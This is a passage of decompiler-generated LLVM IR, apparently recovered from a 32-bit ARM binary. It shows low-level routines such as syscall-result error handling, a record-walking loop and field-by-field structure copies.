  br label %dec_label_pc_13c84

dec_label_pc_13c84:                               ; preds = %dec_label_pc_13c58, %dec_label_pc_13c74
  %v1_13c88 = phi i32 [ %v0_13c64, %dec_label_pc_13c58 ], [ -1, %dec_label_pc_13c74 ]
  %v2_13c84 = phi i32 [ %v3_13c58, %dec_label_pc_13c58 ], [ %v2_13c84.pre, %dec_label_pc_13c74 ]
  store i32 %v2_13c84, i32* %r7.global-to-local, align 4
  ret i32 %v1_13c88

; uselistorder directives
  uselistorder i32 %v0_13c64, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13c84, { 1, 0 }
}

define i32 @function_13c8c() local_unnamed_addr {
dec_label_pc_13c8c:
  %v1_13c9c = load i32, i32* @r0, align 4
  ret i32 %v1_13c9c
}

define i32 @function_13ca0() local_unnamed_addr {
dec_label_pc_13ca0:
  %v1_13cb0 = load i32, i32* @r0, align 4
  ret i32 %v1_13cb0
}

define i32 @function_13cb4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13cb4:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_13cb4 = load i32, i32* @r5, align 4
  %v18_13cb4 = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13ce4, label %dec_label_pc_13cd0

dec_label_pc_13cd0:                               ; preds = %dec_label_pc_13cb4
  %v0_13cd0 = call i32 @function_11200()
  %v0_13cd4 = load i32, i32* @r5, align 4
  %v1_13cd4 = sub i32 0, %v0_13cd4
  store i32 %v1_13cd4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  %v2_13cdc = inttoptr i32 %v0_13cd0 to i32*
  store i32 %v1_13cd4, i32* %v2_13cdc, align 4
  br label %dec_label_pc_13d38

dec_label_pc_13ce4:                               ; preds = %dec_label_pc_13cb4
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13ce4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_13cec = add i32 %arg2, %arg1
  store i32 %v3_13cec, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13ce4, %bb
  %v1_13d284 = phi i32 [ %v18_13cb4, %dec_label_pc_13ce4 ], [ %v3_13cec, %bb ]
  %v0_13d242 = phi i32 [ 141, %dec_label_pc_13ce4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_13d38, label %dec_label_pc_13d24

dec_label_pc_13cf8:                               ; preds = %dec_label_pc_13d24
  %v1_13cf8 = add i32 %v0_13cf8, 8
  %v2_13cf8 = inttoptr i32 %v1_13cf8 to i16*
  %v3_13cf8 = load i16, i16* %v2_13cf8, align 2
  %v4_13cf8 = zext i16 %v3_13cf8 to i32
  %v2_13cfc = add i32 %v4_13cf8, %v0_13cf8
  store i32 %v2_13cfc, i32* %r3.global-to-local, align 4
  %v1_13d00 = add i32 %v2_13cfc, -1
  %v2_13d00 = inttoptr i32 %v1_13d00 to i8*
  %v3_13d00 = load i8, i8* %v2_13d00, align 1
  %v4_13d00 = zext i8 %v3_13d00 to i32
  store i32 %v4_13d00, i32* @r4, align 4
  %v1_13d04 = call i32 @function_15830(i32 %v1_13d24)
  %v0_13d08 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13d08, i32* @r1, align 4
  %v1_13d0c = add i32 %v1_13d04, 1
  store i32 %v1_13d0c, i32* @r2, align 4
  %v0_13d10 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13d10, i32* @r0, align 4
  %v3_13d14 = call i32 @function_112f0(i32 %v0_13d10, i32 %v0_13d08, i32 %v1_13d0c)
  %v0_13d18 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d18 = add i32 %v0_13d18, 8
  %v2_13d18 = inttoptr i32 %v1_13d18 to i16*
  %v3_13d18 = load i16, i16* %v2_13d18, align 2
  %v4_13d18 = zext i16 %v3_13d18 to i32
  store i32 %v4_13d18, i32* %r3.global-to-local, align 4
  %v0_13d1c = load i32, i32* @r4, align 4
  %v1_13d1c = trunc i32 %v0_13d1c to i8
  %v3_13d1c = add i32 %v0_13d18, 10
  %v4_13d1c = inttoptr i32 %v3_13d1c to i8*
  store i8 %v1_13d1c, i8* %v4_13d1c, align 1
  %v0_13d20 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d20 = load i32, i32* %r3.global-to-local, align 4
  %v2_13d20 = add i32 %v1_13d20, %v0_13d20
  store i32 %v2_13d20, i32* %r7.global-to-local, align 4
  %v1_13d28.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13d24

dec_label_pc_13d24:                               ; preds = %.thread, %dec_label_pc_13cf8
  %v1_13d28 = phi i32 [ %v1_13d28.pre, %dec_label_pc_13cf8 ], [ %v1_13d284, %.thread ]
  %v0_13cf8 = phi i32 [ %v2_13d20, %dec_label_pc_13cf8 ], [ %v0_13d242, %.thread ]
  %v1_13d24 = add i32 %v0_13cf8, 10
  store i32 %v1_13d24, i32* %r6.global-to-local, align 4
  %v3_13d28 = icmp ult i32 %v0_13cf8, %v1_13d28
  %v1_13d30 = add i32 %v0_13cf8, 11
  store i32 %v1_13d30, i32* %r8.global-to-local, align 4
  br i1 %v3_13d28, label %dec_label_pc_13cf8, label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %dec_label_pc_13d24, %.thread, %dec_label_pc_13cd0
  %v0_13d38 = load i32, i32* @r5, align 4
  store i32 %v6_13cb4, i32* @r5, align 4
  store i32 %v18_13cb4, i32* @sl, align 4
  ret i32 %v0_13d38

; uselistorder directives
  uselistorder i32 %v1_13d24, { 1, 0 }
  uselistorder i32 %v0_13cf8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_13cb4, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13d24, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13d48() local_unnamed_addr {
dec_label_pc_13d48:
  %r7.global-to-local = alloca i32, align 4
  %v0_13d50 = load i32, i32* @r1, align 4
  store i32 %v0_13d50, i32* @r3, align 4
  %v0_13d60 = load i32, i32* @r0, align 4
  store i32 %v0_13d60, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13d60, -4095
  br i1 %tmp, label %dec_label_pc_13d80, label %dec_label_pc_13d6c

dec_label_pc_13d6c:                               ; preds = %dec_label_pc_13d48
  %v0_13d6c = call i32 @function_11200()
  %v0_13d70 = load i32, i32* %r7.global-to-local, align 4
  %v1_13d70 = sub i32 0, %v0_13d70
  store i32 %v1_13d70, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_13d78 = inttoptr i32 %v0_13d6c to i32*
  store i32 %v1_13d70, i32* %v2_13d78, align 4
  br label %dec_label_pc_13d90

dec_label_pc_13d80:                               ; preds = %dec_label_pc_13d48
  %v2_13d80 = icmp eq i32 %v0_13d60, 0
  br i1 %v2_13d80, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13d80
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13d80, %bb
  call void @__pseudo_cond_branch(i1 %v2_13d80, i32 ptrtoint (i32* @global_var_13f98.489 to i32))
  br label %dec_label_pc_13d90

dec_label_pc_13d90:                               ; preds = %dec_label_pc_13d6c, %.thread
  %v0_13d90 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_13d90

; uselistorder directives
  uselistorder i32 %v0_13d60, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13d90, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13da0(i32 %arg1) local_unnamed_addr {
dec_label_pc_13da0:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13da0 = load i32, i32* @r4, align 4
  store i32 %v3_13da0, i32* %stack_var_-16, align 4
  store i32 124804, i32* %r4.global-to-local, align 4
  %v4_13db0 = load i32, i32* @global_var_20a48.492, align 4
  %v2_13db4 = icmp eq i32 %v4_13db0, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_13db4, label %dec_label_pc_13dc0, label %dec_label_pc_13dd0

dec_label_pc_13dc0:                               ; preds = %dec_label_pc_13da0
  %v1_13dc4 = call i32 @function_15d3c(i32 0)
  %v1_13dc8 = icmp slt i32 %v1_13dc4, 0
  br i1 %v1_13dc8, label %dec_label_pc_13df4, label %dec_label_pc_13dd0thread-pre-split

dec_label_pc_13dd0thread-pre-split:               ; preds = %dec_label_pc_13dc0
  %v0_13dd4.pr = load i32, i32* %r5.global-to-local, align 4
  %v4_13dd0.pre = load i32, i32* @global_var_20a48.492, align 4
  br label %dec_label_pc_13dd0

dec_label_pc_13dd0:                               ; preds = %dec_label_pc_13dd0thread-pre-split, %dec_label_pc_13da0
  %v0_13de0 = phi i32 [ %v4_13dd0.pre, %dec_label_pc_13dd0thread-pre-split ], [ %v4_13db0, %dec_label_pc_13da0 ]
  %v1_13de4 = phi i32 [ %v0_13dd4.pr, %dec_label_pc_13dd0thread-pre-split ], [ %arg1, %dec_label_pc_13da0 ]
  %v2_13dd4 = icmp eq i32 %v1_13de4, 0
  store i32 %v0_13de0, i32* %r4.global-to-local, align 4
  br i1 %v2_13dd4, label %dec_label_pc_13df8, label %dec_label_pc_13de0

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13dd0
  %v2_13de4 = add i32 %v1_13de4, %v0_13de0
  %v1_13de8 = call i32 @function_15d3c(i32 %v2_13de4)
  %v1_13dec = icmp slt i32 %v1_13de8, 0
  br i1 %v1_13dec, label %dec_label_pc_13df4, label %dec_label_pc_13de0.dec_label_pc_13df8_crit_edge

dec_label_pc_13de0.dec_label_pc_13df8_crit_edge:  ; preds = %dec_label_pc_13de0
  %v0_13df8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13df8

dec_label_pc_13df4:                               ; preds = %dec_label_pc_13de0, %dec_label_pc_13dc0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13df8

dec_label_pc_13df8:                               ; preds = %dec_label_pc_13dd0, %dec_label_pc_13de0.dec_label_pc_13df8_crit_edge, %dec_label_pc_13df4
  %v0_13df8 = phi i32 [ %v0_13df8.pre, %dec_label_pc_13de0.dec_label_pc_13df8_crit_edge ], [ -1, %dec_label_pc_13df4 ], [ %v0_13de0, %dec_label_pc_13dd0 ]
  %v2_13dfc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13dfc, i32* @r4, align 4
  ret i32 %v0_13df8

; uselistorder directives
  uselistorder i32 %v0_13de0, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_15d3c, { 1, 0 }
  uselistorder label %dec_label_pc_13df8, { 2, 1, 0 }
}

define i32 @function_13e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_13e0c:
  %v1_13e1c = load i32, i32* @r0, align 4
  ret i32 %v1_13e1c
}

define i32 @function_13e20(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13e20:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_13e20 = load i32, i32* @r4, align 4
  store i32 %v3_13e20, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_13e38 = inttoptr i32 %arg2 to i8*
  %v3_13e38 = call i32 @function_11250(i8* %v2_13e38, i32 0)
  %v2_13e3c = load i32, i32* %arg1, align 4
  store i32 %v2_13e3c, i32* %r3.global-to-local, align 4
  %v3_13e3c = add i32 %tmp, 4
  %v4_13e3c = inttoptr i32 %v3_13e3c to i32*
  %v5_13e3c = load i32, i32* %v4_13e3c, align 4
  store i32 %v5_13e3c, i32* %r4.global-to-local, align 4
  %v0_13e40 = load i32, i32* %r5.global-to-local, align 4
  %v1_13e40 = inttoptr i32 %v0_13e40 to i32*
  store i32 %v2_13e3c, i32* %v1_13e40, align 4
  %v3_13e40 = add i32 %v0_13e40, 4
  %v4_13e40 = inttoptr i32 %v3_13e40 to i32*
  %v5_13e40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13e40, i32* %v4_13e40, align 4
  %v0_13e44 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e44 = add i32 %v0_13e44, 12
  %v2_13e44 = inttoptr i32 %v1_13e44 to i32*
  %v3_13e44 = load i32, i32* %v2_13e44, align 4
  %v1_13e48 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e48 = add i32 %v1_13e48, 12
  %v3_13e48 = inttoptr i32 %v2_13e48 to i32*
  store i32 %v3_13e44, i32* %v3_13e48, align 4
  %v0_13e4c = load i32, i32* %r6.global-to-local, align 4
  %v1_13e4c = add i32 %v0_13e4c, 96
  store i32 %v1_13e4c, i32* %r3.global-to-local, align 4
  %v1_13e50 = inttoptr i32 %v1_13e4c to i32*
  %v2_13e50 = load i32, i32* %v1_13e50, align 4
  store i32 %v2_13e50, i32* %r3.global-to-local, align 4
  %v3_13e50 = add i32 %v0_13e4c, 100
  %v4_13e50 = inttoptr i32 %v3_13e50 to i32*
  %v5_13e50 = load i32, i32* %v4_13e50, align 4
  store i32 %v5_13e50, i32* %r4.global-to-local, align 4
  %v1_13e54 = add i32 %v0_13e4c, 56
  %v2_13e54 = inttoptr i32 %v1_13e54 to i32*
  %v3_13e54 = load i32, i32* %v2_13e54, align 4
  store i32 %v3_13e54, i32* %r2.global-to-local, align 4
  %v1_13e58 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e58 = add i32 %v1_13e58, 96
  %v3_13e58 = inttoptr i32 %v2_13e58 to i32*
  store i32 %v2_13e50, i32* %v3_13e58, align 4
  %v0_13e5c = load i32, i32* %r4.global-to-local, align 4
  %v1_13e5c = load i32, i32* %r5.global-to-local, align 4
  %v2_13e5c = add i32 %v1_13e5c, 100
  %v3_13e5c = inttoptr i32 %v2_13e5c to i32*
  store i32 %v0_13e5c, i32* %v3_13e5c, align 4
  %v0_13e60 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e60 = add i32 %v0_13e60, 24
  store i32 %v1_13e60, i32* %ip.global-to-local, align 4
  %v1_13e64 = inttoptr i32 %v1_13e60 to i32*
  %v2_13e64 = load i32, i32* %v1_13e64, align 4
  store i32 %v2_13e64, i32* %ip.global-to-local, align 4
  %v3_13e64 = add i32 %v0_13e60, 28
  %v4_13e64 = inttoptr i32 %v3_13e64 to i32*
  %v5_13e64 = load i32, i32* %v4_13e64, align 4
  store i32 %v5_13e64, i32* %lr.global-to-local, align 4
  %v0_13e68 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e68 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e68 = add i32 %v1_13e68, 56
  %v3_13e68 = inttoptr i32 %v2_13e68 to i32*
  store i32 %v0_13e68, i32* %v3_13e68, align 4
  %v0_13e6c = load i32, i32* %r6.global-to-local, align 4
  %v1_13e6c = add i32 %v0_13e6c, 72
  store i32 %v1_13e6c, i32* %r3.global-to-local, align 4
  %v1_13e70 = add i32 %v0_13e6c, 32
  store i32 %v1_13e70, i32* %r7.global-to-local, align 4
  %v1_13e74 = inttoptr i32 %v1_13e70 to i32*
  %v2_13e74 = load i32, i32* %v1_13e74, align 4
  store i32 %v2_13e74, i32* %r7.global-to-local, align 4
  %v3_13e74 = add i32 %v0_13e6c, 36
  %v4_13e74 = inttoptr i32 %v3_13e74 to i32*
  %v5_13e74 = load i32, i32* %v4_13e74, align 4
  store i32 %v5_13e74, i32* %r8.global-to-local, align 4
  %v1_13e78 = inttoptr i32 %v1_13e6c to i32*
  %v2_13e78 = load i32, i32* %v1_13e78, align 4
  %v3_13e78 = add i32 %v0_13e6c, 76
  %v4_13e78 = inttoptr i32 %v3_13e78 to i32*
  %v5_13e78 = load i32, i32* %v4_13e78, align 4
  store i32 %v5_13e78, i32* %r1.global-to-local, align 4
  %v0_13e7c = load i32, i32* %r5.global-to-local, align 4
  %v1_13e7c = add i32 %v0_13e7c, 72
  %v1_13e80 = inttoptr i32 %v1_13e7c to i32*
  store i32 %v2_13e78, i32* %v1_13e80, align 4
  %v3_13e80 = add i32 %v0_13e7c, 76
  %v4_13e80 = inttoptr i32 %v3_13e80 to i32*
  %v5_13e80 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13e80, i32* %v4_13e80, align 4
  %v0_13e84 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e84 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e84 = add i32 %v1_13e84, 32
  %v3_13e84 = inttoptr i32 %v2_13e84 to i32*
  store i32 %v0_13e84, i32* %v3_13e84, align 4
  %v0_13e88 = load i32, i32* %r8.global-to-local, align 4
  %v1_13e88 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e88 = add i32 %v1_13e88, 36
  %v3_13e88 = inttoptr i32 %v2_13e88 to i32*
  store i32 %v0_13e88, i32* %v3_13e88, align 4
  %v0_13e8c = load i32, i32* %r6.global-to-local, align 4
  %v1_13e8c = add i32 %v0_13e8c, 80
  store i32 %v1_13e8c, i32* %r3.global-to-local, align 4
  %v1_13e90 = add i32 %v0_13e8c, 48
  store i32 %v1_13e90, i32* %r7.global-to-local, align 4
  %v1_13e94 = inttoptr i32 %v1_13e90 to i32*
  %v2_13e94 = load i32, i32* %v1_13e94, align 4
  store i32 %v2_13e94, i32* %r7.global-to-local, align 4
  %v3_13e94 = add i32 %v0_13e8c, 52
  %v4_13e94 = inttoptr i32 %v3_13e94 to i32*
  %v5_13e94 = load i32, i32* %v4_13e94, align 4
  store i32 %v5_13e94, i32* %r8.global-to-local, align 4
  %v1_13e98 = inttoptr i32 %v1_13e8c to i32*
  %v2_13e98 = load i32, i32* %v1_13e98, align 4
  %v3_13e98 = add i32 %v0_13e8c, 84
  %v4_13e98 = inttoptr i32 %v3_13e98 to i32*
  %v5_13e98 = load i32, i32* %v4_13e98, align 4
  store i32 %v5_13e98, i32* %r1.global-to-local, align 4
  %v1_13e9c = add i32 %v0_13e8c, 16
  %v2_13e9c = inttoptr i32 %v1_13e9c to i32*
  %v3_13e9c = load i32, i32* %v2_13e9c, align 4
  store i32 %v3_13e9c, i32* %r2.global-to-local, align 4
  %v0_13ea0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ea0 = add i32 %v0_13ea0, 80
  %v1_13ea4 = inttoptr i32 %v1_13ea0 to i32*
  store i32 %v2_13e98, i32* %v1_13ea4, align 4
  %v3_13ea4 = add i32 %v0_13ea0, 84
  %v4_13ea4 = inttoptr i32 %v3_13ea4 to i32*
  %v5_13ea4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13ea4, i32* %v4_13ea4, align 4
  %v0_13ea8 = load i32, i32* %r7.global-to-local, align 4
  %v1_13ea8 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ea8 = add i32 %v1_13ea8, 48
  %v3_13ea8 = inttoptr i32 %v2_13ea8 to i32*
  store i32 %v0_13ea8, i32* %v3_13ea8, align 4
  %v0_13eac = load i32, i32* %r8.global-to-local, align 4
  %v1_13eac = load i32, i32* %r5.global-to-local, align 4
  %v2_13eac = add i32 %v1_13eac, 52
  %v3_13eac = inttoptr i32 %v2_13eac to i32*
  store i32 %v0_13eac, i32* %v3_13eac, align 4
  %v0_13eb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13eb0 = load i32, i32* %r5.global-to-local, align 4
  %v2_13eb0 = add i32 %v1_13eb0, 16
  %v3_13eb0 = inttoptr i32 %v2_13eb0 to i32*
  store i32 %v0_13eb0, i32* %v3_13eb0, align 4
  %v0_13eb4 = load i32, i32* %r6.global-to-local, align 4
  %v1_13eb4 = add i32 %v0_13eb4, 88
  store i32 %v1_13eb4, i32* %r3.global-to-local, align 4
  %v1_13eb8 = add i32 %v0_13eb4, 20
  %v2_13eb8 = inttoptr i32 %v1_13eb8 to i32*
  %v3_13eb8 = load i32, i32* %v2_13eb8, align 4
  store i32 %v3_13eb8, i32* %r2.global-to-local, align 4
  %v1_13ebc = inttoptr i32 %v1_13eb4 to i32*
  %v2_13ebc = load i32, i32* %v1_13ebc, align 4
  %v3_13ebc = add i32 %v0_13eb4, 92
  %v4_13ebc = inttoptr i32 %v3_13ebc to i32*
  %v5_13ebc = load i32, i32* %v4_13ebc, align 4
  store i32 %v5_13ebc, i32* %r1.global-to-local, align 4
  %v1_13ec0 = add i32 %v0_13eb4, 64
  store i32 %v1_13ec0, i32* %r6.global-to-local, align 4
  %v1_13ec4 = inttoptr i32 %v1_13ec0 to i32*
  %v2_13ec4 = load i32, i32* %v1_13ec4, align 4
  store i32 %v2_13ec4, i32* %r6.global-to-local, align 4
  %v3_13ec4 = add i32 %v0_13eb4, 68
  %v4_13ec4 = inttoptr i32 %v3_13ec4 to i32*
  %v5_13ec4 = load i32, i32* %v4_13ec4, align 4
  store i32 %v5_13ec4, i32* %r7.global-to-local, align 4
  %v0_13ec8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ec8 = add i32 %v0_13ec8, 88
  store i32 %v1_13ec8, i32* %r3.global-to-local, align 4
  %v2_13ecc = add i32 %v0_13ec8, 20
  %v3_13ecc = inttoptr i32 %v2_13ecc to i32*
  store i32 %v3_13eb8, i32* %v3_13ecc, align 4
  %v0_13ed0 = load i32, i32* %ip.global-to-local, align 4
  %v1_13ed0 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ed0 = add i32 %v1_13ed0, 24
  %v3_13ed0 = inttoptr i32 %v2_13ed0 to i32*
  store i32 %v0_13ed0, i32* %v3_13ed0, align 4
  %v0_13ed4 = load i32, i32* %lr.global-to-local, align 4
  %v1_13ed4 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ed4 = add i32 %v1_13ed4, 28
  %v3_13ed4 = inttoptr i32 %v2_13ed4 to i32*
  store i32 %v0_13ed4, i32* %v3_13ed4, align 4
  %v0_13ed8 = load i32, i32* %r6.global-to-local, align 4
  %v1_13ed8 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ed8 = add i32 %v1_13ed8, 64
  %v3_13ed8 = inttoptr i32 %v2_13ed8 to i32*
  store i32 %v0_13ed8, i32* %v3_13ed8, align 4
  %v0_13edc = load i32, i32* %r7.global-to-local, align 4
  %v1_13edc = load i32, i32* %r5.global-to-local, align 4
  %v2_13edc = add i32 %v1_13edc, 68
  %v3_13edc = inttoptr i32 %v2_13edc to i32*
  store i32 %v0_13edc, i32* %v3_13edc, align 4
  %v0_13ee0 = load i32, i32* %r3.global-to-local, align 4
  %v1_13ee0 = inttoptr i32 %v0_13ee0 to i32*
  store i32 %v2_13ebc, i32* %v1_13ee0, align 4
  %v3_13ee0 = add i32 %v0_13ee0, 4
  %v4_13ee0 = inttoptr i32 %v3_13ee0 to i32*
  %v5_13ee0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13ee0, i32* %v4_13ee0, align 4
  %v2_13ee4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13ee4, i32* %r4.global-to-local, align 4
  ret i32 %v2_13ebc

; uselistorder directives
  uselistorder i32 %v0_13eb4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_13e8c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 1, 0, 2 }
  uselistorder i32 104, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_13eec(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13eec:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_13eec = load i32, i32* @r4, align 4
  store i32 %v3_13eec, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_13f04 = inttoptr i32 %arg2 to i8*
  %v3_13f04 = call i32 @function_11250(i8* %v2_13f04, i32 0)
  %v2_13f08 = load i32, i32* %arg1, align 4
  %v3_13f08 = add i32 %tmp, 4
  %v4_13f08 = inttoptr i32 %v3_13f08 to i32*
  %v5_13f08 = load i32, i32* %v4_13f08, align 4
  store i32 %v5_13f08, i32* %r4.global-to-local, align 4
  %v0_13f0c = load i32, i32* %r6.global-to-local, align 4
  %v1_13f0c = inttoptr i32 %v0_13f0c to i32*
  store i32 %v2_13f08, i32* %v1_13f0c, align 4
  %v3_13f0c = add i32 %v0_13f0c, 4
  %v4_13f0c = inttoptr i32 %v3_13f0c to i32*
  %v5_13f0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13f0c, i32* %v4_13f0c, align 4
  %v0_13f10 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f10 = add i32 %v0_13f10, 32
  %v1_13f14 = inttoptr i32 %v1_13f10 to i32*
  %v2_13f14 = load i32, i32* %v1_13f14, align 4
  %v3_13f14 = add i32 %v0_13f10, 36
  %v4_13f14 = inttoptr i32 %v3_13f14 to i32*
  %v5_13f14 = load i32, i32* %v4_13f14, align 4
  store i32 %v5_13f14, i32* %r4.global-to-local, align 4
  %v1_13f18 = add i32 %v0_13f10, 96
  %v2_13f18 = inttoptr i32 %v1_13f18 to i32*
  %v3_13f18 = load i32, i32* %v2_13f18, align 4
  store i32 %v3_13f18, i32* %r2.global-to-local, align 4
  %v1_13f1c = load i32, i32* %r6.global-to-local, align 4
  %v2_13f1c = add i32 %v1_13f1c, 32
  %v3_13f1c = inttoptr i32 %v2_13f1c to i32*
  store i32 %v2_13f14, i32* %v3_13f1c, align 4
  %v0_13f20 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f20 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f20 = add i32 %v1_13f20, 36
  %v3_13f20 = inttoptr i32 %v2_13f20 to i32*
  store i32 %v0_13f20, i32* %v3_13f20, align 4
  %v0_13f24 = load i32, i32* %r2.global-to-local, align 4
  %v1_13f24 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f24 = add i32 %v1_13f24, 12
  %v3_13f24 = inttoptr i32 %v2_13f24 to i32*
  store i32 %v0_13f24, i32* %v3_13f24, align 4
  %v0_13f28 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f28 = add i32 %v0_13f28, 48
  %v2_13f28 = inttoptr i32 %v1_13f28 to i32*
  %v3_13f28 = load i32, i32* %v2_13f28, align 4
  %v1_13f2c = add i32 %v0_13f28, 24
  store i32 %v1_13f2c, i32* %ip.global-to-local, align 4
  %v1_13f30 = inttoptr i32 %v1_13f2c to i32*
  %v2_13f30 = load i32, i32* %v1_13f30, align 4
  store i32 %v2_13f30, i32* %ip.global-to-local, align 4
  %v3_13f30 = add i32 %v0_13f28, 28
  %v4_13f30 = inttoptr i32 %v3_13f30 to i32*
  %v5_13f30 = load i32, i32* %v4_13f30, align 4
  store i32 %v5_13f30, i32* %lr.global-to-local, align 4
  %v1_13f34 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f34 = add i32 %v1_13f34, 44
  %v3_13f34 = inttoptr i32 %v2_13f34 to i32*
  store i32 %v3_13f28, i32* %v3_13f34, align 4
  %v0_13f38 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f38 = add i32 %v0_13f38, 64
  %v2_13f38 = inttoptr i32 %v1_13f38 to i32*
  %v3_13f38 = load i32, i32* %v2_13f38, align 4
  %v1_13f3c = add i32 %v0_13f38, 56
  %v2_13f3c = inttoptr i32 %v1_13f3c to i32*
  %v3_13f3c = load i32, i32* %v2_13f3c, align 4
  store i32 %v3_13f3c, i32* %r2.global-to-local, align 4
  %v1_13f40 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f40 = add i32 %v1_13f40, 52
  %v3_13f40 = inttoptr i32 %v2_13f40 to i32*
  store i32 %v3_13f38, i32* %v3_13f40, align 4
